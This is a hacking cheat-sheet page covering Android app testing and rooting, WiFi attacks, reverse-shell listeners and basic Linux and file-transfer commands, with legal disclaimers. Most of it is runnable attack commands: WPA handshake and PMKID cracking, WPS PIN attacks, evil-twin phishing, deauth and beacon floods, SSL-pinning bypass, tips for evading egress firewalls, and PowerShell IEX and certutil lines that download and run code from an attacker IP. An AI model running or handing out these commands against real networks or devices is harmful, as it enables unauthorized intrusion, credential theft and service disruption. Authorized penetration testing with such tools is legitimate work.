Android Hacking

Android Hacking Guide

Complete Android penetration testing workflow — static analysis, dynamic instrumentation, payloads and rooting. All techniques must be used on apps you own or have explicit written permission to test.

Legal: Only test apps you own or have explicit written authorization to test. Unauthorized testing is illegal under the IT Act and CFAA.

1. Setting Up the Environment

Install required tools on Kali Linux or any Debian-based distro.

# Update system
sudo apt update && sudo apt upgrade -y

# Java (needed by apktool/jadx)
sudo apt install -y default-jdk

# APK decompilers
sudo apt install -y apktool jadx dex2jar

# Install ADB and Fastboot
sudo apt install -y android-tools-adb android-tools-fastboot

# Install Frida
pip3 install frida-tools

# Install Objection
pip3 install objection

# MobSF (Docker)
docker pull opensecurity/mobile-security-framework-mobsf
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf

2. Static Analysis — Decompile APK

Extract and read the APK without running it.

# Decompile resources and smali
apktool d target.apk -o target_src

# Decompile to Java
jadx -d jadx_out target.apk

# Convert dex to jar
d2j-dex2jar target.apk -o target.jar

# Scan for API keys and secrets
apkleaks -f target.apk -o leaks.txt

# Look at AndroidManifest
cat target_src/AndroidManifest.xml | grep -E "exported|permission|debuggable"

What to look for

  • android:exported="true" on activities, services, receivers
  • android:debuggable="true" in release builds
  • android:allowBackup="true" (data extraction risk)
  • Hardcoded API keys, tokens, credentials
  • Custom URL schemes and deep links
  • WebView with setJavaScriptEnabled(true)

3. Dynamic Analysis with Frida

Hook into a running app to intercept function calls and bypass checks.

# Push frida-server to rooted device
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"

# List running apps
frida-ps -U

# Attach to a running app
frida -U -n com.target.app

# Or spawn the app
frida -U -f com.target.app

# Use Objection for quick exploration
objection -g com.target.app explore

# Common Objection commands inside
android root disable
android sslpinning disable
android hooking list activities
android hooking list classes
env

4. Rooting Android — Magisk

Systemless root that passes SafetyNet for testing purposes.

  1. Unlock bootloader (fastboot oem unlock)
  2. Download the stock boot image for your device
  3. Install Magisk APK from github.com/topjohnwu/Magisk
  4. In Magisk app: Install → Patch a File → select boot.img
  5. Flash patched boot.img: fastboot flash boot magisk_patched.img
  6. Reboot and open Magisk to verify root
  7. Install LSPosed for Xposed modules: github.com/LSPosed/LSPosed

WiFi Hacking

WiFi Hacking Methods

Complete wireless penetration testing methodology. From monitor mode to WPA2 handshake capture, PMKID attacks, WPS exploitation and evil twin setups.

Legal: Only test WiFi networks you own or have explicit written authorization to assess. Unauthorized access to networks is illegal worldwide.

1. Enable Monitor Mode

# Kill interfering processes
sudo airmon-ng check kill

# List wireless interfaces
sudo airmon-ng

# Enable monitor mode
sudo airmon-ng start wlan0

# Verify
iwconfig

# Disable monitor mode when done
sudo airmon-ng stop wlan0mon

2. Scan Networks

# Scan all networks
sudo airodump-ng wlan0mon

# Scan specific band/channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Filter by band (2.4GHz)
sudo airodump-ng --band bg wlan0mon

# Filter by band (5GHz)
sudo airodump-ng --band a wlan0mon

3. WPA2 Handshake Capture & Crack

# Terminal 1: capture on target channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Terminal 2: deauth a client to force re-handshake
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# When "WPA handshake" appears in airodump — stop capture

# Crack with aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Or with hashcat (faster)
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

4. PMKID Attack (no clients needed)

Captures PMKID from the AP directly — no deauth required.

# Capture PMKID
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Convert to hashcat format
hcxpcapngtool -o hash.hc22000 pmkid.pcapng

# Crack
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

5. WPS PIN Attack

# Scan for WPS-enabled APs
sudo wash -i wlan0mon

# Reaver attack
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K 1

# Or Bully
sudo bully -b AA:BB:CC:DD:EE:FF -c 6 -d wlan0mon

# Pixie Dust attack (fast)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv

6. Evil Twin Attack

# Wifiphisher — automated evil twin
sudo wifiphisher -e "Free WiFi" -p firmware-upgrade

# Fluxion — captive portal
sudo fluxion

# EAPHammer — Enterprise
sudo eaphammer -i wlan0 --channel 6 --auth wpa-eap \
  --essid "CorpWiFi" --creds

# hostapd-wpe — manual rogue AP
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

7. Deauth & DoS (authorized only)

# Continuous deauth against one client
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# MDK4 — beacon flood
sudo mdk4 wlan0mon b -f /path/to/ssids.txt

# MDK4 — deauth all
sudo mdk4 wlan0mon d

Listener Setup

Run one of these on YOUR machine to catch the shell.

# Netcat listener
nc -lvnp 4444

# Socat listener
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# Metasploit handler
msfconsole -q
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
run

Tips

  • Use port 443, 80, or 53 to bypass egress firewalls
  • Encode payloads in Base64 for PowerShell to avoid quoting issues
  • Upgrade dumb shell to full TTY: python3 -c 'import pty;pty.spawn("/bin/bash")'
  • Background shell: Ctrl+Z, then stty raw -echo; fg
  • Use HTTPS listeners (Socat + Let's Encrypt) for encrypted reverse shells

Beginner Commands

Essential commands every hacker must know. Copy, practice, and build muscle memory.

Linux Essentials

# Navigation
pwd                     # current directory
ls -la                  # list all with details
cd /path/to/dir         # change directory
cd ~                    # home directory
cd -                    # previous directory

# Files
cat file.txt            # show contents
less file.txt           # paginated view
head -n 20 file.txt     # first 20 lines
tail -f /var/log/syslog # follow log
touch newfile           # create empty file
mkdir -p a/b/c          # create nested dirs
cp -r src dst           # recursive copy
mv old new              # move/rename
rm -rf dir              # delete (careful!)

# Permissions
chmod +x script.sh      # make executable
chmod 755 file          # rwxr-xr-x
chown user:group file   # change owner

# Search
find / -name "*.conf" 2>/dev/null
grep -r "password" /etc 2>/dev/null
locate filename         # fast file search
which python3           # path of command

# Process
ps aux                  # all processes
top / htop              # live process monitor
kill -9 PID             # force kill
pkill -f name           # kill by name

# Network
ip a                    # IP addresses
ip r                    # routing table
ss -tuln                # listening ports
netstat -tulnp          # alternative
ping -c 4 8.8.8.8       # test connectivity

Networking Commands

# DNS
dig example.com ANY
nslookup example.com
host -t mx example.com

# HTTP
curl -I https://example.com
curl -X POST -d "key=val" https://example.com
wget https://example.com/file.zip

# Scanning (own systems only)
nmap -sV -sC target
nmap -p- target
nmap -sn 192.168.1.0/24       # ping sweep

# Packet capture
sudo tcpdump -i eth0 -w capture.pcap
sudo tcpdump -i eth0 port 80 -A

# Tunnels
ssh -L 8080:localhost:80 user@host      # local forward
ssh -R 9090:localhost:22 user@host      # remote forward
ssh -D 1080 user@host                   # SOCKS proxy

File Transfer

# SCP
scp file.txt user@host:/tmp/
scp user@host:/tmp/file.txt .

# Python HTTP server (serve from your machine)
python3 -m http.server 8000

# Download from that server
wget http://10.10.10.10:8000/file.txt
curl -O http://10.10.10.10:8000/file.txt

# Netcat file transfer
# Receiver:
nc -lvnp 4444 > file.txt
# Sender:
nc 10.10.10.10 4444 < file.txt

# Base64 pipe (for tiny files)
base64 file | ssh user@host "base64 -d > file"

# Certutil (Windows)
certutil -urlcache -f http://10.10.10.10/file.exe file.exe

# PowerShell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/script.ps1')

Kali Linux Installation (VM)

  1. Download VirtualBox from virtualbox.org
  2. Download Kali ISO from kali.org/get-kali
  3. Verify SHA256 checksum from the Kali site
  4. Create VM: 4GB RAM, 2 cores, 40GB disk, NAT network
  5. Boot ISO and follow installer
  6. After install, update everything:
sudo apt update && sudo apt full-upgrade -y
sudo apt install -y kali-linux-default
